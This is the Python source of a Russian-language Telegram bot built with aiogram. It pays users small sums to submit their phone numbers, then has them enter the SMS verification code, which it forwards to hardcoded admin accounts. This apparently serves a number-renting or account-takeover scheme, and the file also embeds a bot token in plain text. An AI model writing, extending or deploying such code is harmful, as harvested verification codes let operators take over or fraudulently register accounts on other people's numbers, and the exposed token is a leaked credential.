import asyncio
import logging
import aiosqlite
import re
import sqlite3
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (ReplyKeyboardMarkup, KeyboardButton, 
                            InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery)
from aiogram.enums import ChatMemberStatus

# --- КОНФИГУРАЦИЯ ---
TOKEN = "8527593341:AAFSVj-6REvcGL7UpsMlRWqnZlZw8GaXA4Y"
ADMIN_IDS = [7323981601, 8383446699] 
CHANNEL_LINK = "https://t.me/+4K_4dildrI82ODY6"
CHANNEL_ID = -1003532318157
SUPPORT_LINK = "https://t.me/ik_126"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN)
dp = Dispatcher(storage=MemoryStorage())

WORK_STATUS = True 

# --- СОСТОЯНИЯ ---
class Form(StatesGroup):
    choosing_tariff = State()
    entering_number = State()
    entering_code = State()
    broadcasting = State()
    waiting_for_admin_media = State() # Для смены видео/фото

# --- БАЗА ДАННЫХ (Заявки и Настройки) ---
async def init_db():
    async with aiosqlite.connect('bot_database.db') as db:
        await db.execute('CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY)')
        await db.execute('''CREATE TABLE IF NOT EXISTS requests 
                           (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, 
                            phone TEXT, tariff TEXT, code TEXT, status INTEGER DEFAULT 0)''')
        # Таблица для хранения видео/фото приветствия
        await db.execute('CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT, type TEXT)')
        await db.commit()

# --- ФУНКЦИИ МЕДИА ---
async def get_welcome_media():
    async with aiosqlite.connect('bot_database.db') as db:
        async with db.execute("SELECT value, type FROM settings WHERE key='welcome_media'") as cursor:
            return await cursor.fetchone()

async def set_welcome_media(file_id, media_type):
    async with aiosqlite.connect('bot_database.db') as db:
        await db.execute("INSERT OR REPLACE INTO settings (key, value, type) VALUES ('welcome_media', ?, ?)", (file_id, media_type))
        await db.commit()

# --- КЛАВИАТУРЫ ---
def main_kb():
    return ReplyKeyboardMarkup(keyboard=[
        [KeyboardButton(text="💸 ПОДКЛЮЧИТЬ ВЫПЛАТЫ / ВВЕСТИ НОМЕР")],
        [KeyboardButton(text="🆘 ТЕХ. ПОДДЕРЖКА")]
    ], resize_keyboard=True, input_field_placeholder="💎 Выберите действие...")

def tariff_kb():
    return ReplyKeyboardMarkup(keyboard=[
        [KeyboardButton(text="⚡️ 1.5$ Рег Момент")],
        [KeyboardButton(text="🌙 2.0$ Выплата вечером")], 
        [KeyboardButton(text="🔙 Назад")]
    ], resize_keyboard=True)

def admin_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎬 Сменить Видео/Фото приветствия", callback_data="admin_change_media")],
        [InlineKeyboardButton(text="📂 Новые заявки", callback_data="admin_view_new")],
        [InlineKeyboardButton(text="✅ Start Work", callback_data="work_start"),
         InlineKeyboardButton(text="❌ Stop Work", callback_data="work_stop")],
        [InlineKeyboardButton(text="📢 Рассылка", callback_data="admin_broadcast")]
    ])

# --- ПРОВЕРКА ПОДПИСКИ ---
async def check_sub(user_id):
    try:
        m = await bot.get_chat_member(CHANNEL_ID, user_id)
        return m.status in [ChatMemberStatus.MEMBER, ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.CREATOR]
    except: return False

# --- ОБРАБОТЧИКИ ---

@dp.message(Command("start"))
async def start(message: types.Message):
    async with aiosqlite.connect('bot_database.db') as db:
        await db.execute('INSERT OR IGNORE INTO users VALUES (?)', (message.from_user.id,))
        await db.commit()
    
    if not await check_sub(message.from_user.id):
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="👉 ПОДПИСАТЬСЯ НА КАНАЛ", url=CHANNEL_LINK)],
            [InlineKeyboardButton(text="🔄 ПРОВЕРИТЬ ПОДПИСКУ", callback_data="check_sub_now")]
        ])
        text = (
            "🔒 <b>ДОСТУП ОГРАНИЧЕН!</b>\n\n"
            "⚠️ Чтобы начать зарабатывать и получить доступ к боту, "
            "необходимо подписаться на наш закрытый канал."
        )
        return await message.answer(text, reply_markup=kb, parse_mode="HTML")
    
    media = await get_welcome_media()
    caption = (
        "<b>👋 ДОБРО ПОЖАЛОВАТЬ!</b>\n"
        "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n\n"
        "🚀 <b>Система готова к работе.</b>\n"
        "Ты попал в команду, где делаются реальные деньги. "
        "Весь функционал настроен и ждет твоих действий.\n\n"
        "💸 <b>Твой статус:</b> <code>АКТИВЕН</code>\n"
        "📉 <b>Доступ:</b> <code>РАЗРЕШЕН</code>"
    )

    if media:
        file_id, m_type = media
        if m_type == 'video':
            await message.answer_video(video=file_id, caption=caption, reply_markup=main_kb(), parse_mode="HTML")
        else:
            await message.answer_photo(photo=file_id, caption=caption, reply_markup=main_kb(), parse_mode="HTML")
    else:
        await message.answer(caption, reply_markup=main_kb(), parse_mode="HTML")

@dp.callback_query(F.data == "check_sub_now")
async def check_sub_callback(callback: CallbackQuery):
    if await check_sub(callback.from_user.id):
        await callback.message.delete()
        await start(callback.message)
    else:
        await callback.answer("❌ Вы не подписаны!", show_alert=True)

# --- АДМИН-МЕДИА ---
@dp.callback_query(F.data == "admin_change_media")
async def admin_change_media(callback: CallbackQuery, state: FSMContext):
    await state.set_state(Form.waiting_for_admin_media)
    await callback.message.answer("📥 <b>Отправьте ВИДЕО или ФОТО</b> для приветствия:")
    await callback.answer()

@dp.message(Form.waiting_for_admin_media, F.content_type.in_({'video', 'photo'}))
async def save_admin_media(message: types.Message, state: FSMContext):
    if message.video:
        await set_welcome_media(message.video.file_id, 'video')
    else:
        await set_welcome_media(message.photo[-1].file_id, 'photo')
    await message.answer("✅ <b>Медиа приветствия успешно обновлено!</b>", parse_mode="HTML")
    await state.clear()

# --- КНОПКИ МЕНЮ ---
@dp.message(F.text == "💸 ПОДКЛЮЧИТЬ ВЫПЛАТЫ / ВВЕСТИ НОМЕР")
async def rent_start(message: types.Message, state: FSMContext):
    if not await check_sub(message.from_user.id): return
    if not WORK_STATUS:
        return await message.answer("😴 <b>Прием номеров временно закрыт.</b>", parse_mode="HTML")
    await state.set_state(Form.choosing_tariff)
    await message.answer("💵 <b>Выберите подходящий тариф:</b>", reply_markup=tariff_kb(), parse_mode="HTML")

@dp.message(F.text == "🆘 ТЕХ. ПОДДЕРЖКА")
async def support_handler(message: types.Message):
    text = (
        "<b>🛡 ТЕХНИЧЕСКАЯ ПОДДЕРЖКА</b>\n"
        "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n\n"
        "Возникли вопросы? Менеджер на связи 24/7.\n"
        f"👉 <a href='{SUPPORT_LINK}'>НАПИСАТЬ В ПОДДЕРЖКУ</a>"
    )
    await message.answer(text, parse_mode="HTML", disable_web_page_preview=True)

# --- ЛОГИКА ТАРИФОВ И НОМЕРА ---
@dp.message(Form.choosing_tariff)
async def rent_tariff(message: types.Message, state: FSMContext):
    if message.text == "🔙 Назад":
        await state.clear()
        return await message.answer("<b>Главное меню:</b>", reply_markup=main_kb(), parse_mode="HTML")
    
    await state.update_data(tariff=message.text)
    await state.set_state(Form.entering_number)
    text = (
        "<b>👤 Добавление по номеру телефона</b>\n"
        "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n\n"
        "Введите номера в форматах:\n"
        "Россия: <code>+7XXXXXXXXXX</code>\n\n"
        "<i>Отправьте номер сообщением ниже 👇</i>"
    )
    await message.answer(text, reply_markup=ReplyKeyboardMarkup(keyboard=[[KeyboardButton(text="🔙 Назад")]], resize_keyboard=True), parse_mode="HTML")

@dp.message(Form.entering_number)
async def rent_number(message: types.Message, state: FSMContext):
    if message.text == "🔙 Назад":
        await state.clear()
        return await message.answer("<b>Главное меню:</b>", reply_markup=main_kb(), parse_mode="HTML")
        
    phone = re.sub(r'\D', '', message.text)
    if len(phone) < 7: return await message.answer("❌ <b>Ошибка в формате номера.</b>", parse_mode="HTML")
    
    data = await state.get_data()
    async with aiosqlite.connect('bot_database.db') as db:
        cursor = await db.execute('INSERT INTO requests (user_id, phone, tariff) VALUES (?, ?, ?)', (message.from_user.id, phone, data['tariff']))
        request_id = cursor.lastrowid
        await db.commit()
    
    admin_kb_req = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Взять в работу", callback_data=f"take_{request_id}_{message.from_user.id}")],
        [InlineKeyboardButton(text="❌ Отмена", callback_data=f"cancelreq_{request_id}_{message.from_user.id}")],
        [InlineKeyboardButton(text="💬 Чат", url=f"tg://user?id={message.from_user.id}")]
    ])

    for admin_id in ADMIN_IDS:
        await bot.send_message(admin_id, f"🆕 <b>Заявка #{request_id}</b>\n📱: <code>{phone}</code>\n💰: {data['tariff']}", parse_mode="HTML", reply_markup=admin_kb_req)
    
    await state.clear()
    await message.answer("⏳ <b>Номер успешно отправлен!</b>\nОжидайте, администратор проверяет данные.", reply_markup=main_kb(), parse_mode="HTML")

# --- КОД И АДМИНКА ---
@dp.message(Form.entering_code)
async def code_input(message: types.Message, state: FSMContext):
    async with aiosqlite.connect('bot_database.db') as db:
        await db.execute('UPDATE requests SET code = ? WHERE user_id = ? AND status = 0', (message.text, message.from_user.id))
        await db.commit()
    for admin_id in ADMIN_IDS:
        await bot.send_message(admin_id, f"🔑 <b>ПОЛУЧЕН КОД!</b>\n👤 ID: <code>{message.from_user.id}</code>\n💬 Код: <code>{message.text}</code>", parse_mode="HTML")
    await state.clear()
    await message.answer("✅ <b>Код успешно передан!</b> Ожидайте выплату.", parse_mode="HTML")

@dp.message(Command("admin"))
async def admin_panel(message: types.Message):
    if message.from_user.id in ADMIN_IDS:
        await message.answer(f"🛠 <b>Админ-панель</b>", reply_markup=admin_kb(), parse_mode="HTML")

# (Здесь остаются остальные твои функции: take_req, cancel_req, work_toggle, perform_broadcast из предыдущего кода)

@dp.callback_query(F.data.startswith("take_"))
async def take_req(callback: CallbackQuery):
    _, req_id, user_id = callback.data.split("_")
    user_state = dp.fsm.get_context(bot, chat_id=int(user_id), user_id=int(user_id))
    await user_state.set_state(Form.entering_code)
    await bot.send_message(user_id, "🔔 <b>Админ взял ваш номер!</b>\n\nВведите код из СМС ниже 👇", parse_mode="HTML")
    await callback.message.edit_text(callback.message.text + "\n\nСтатус: 🟡 В работе")
    await callback.answer()

async def main():
    await init_db()
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
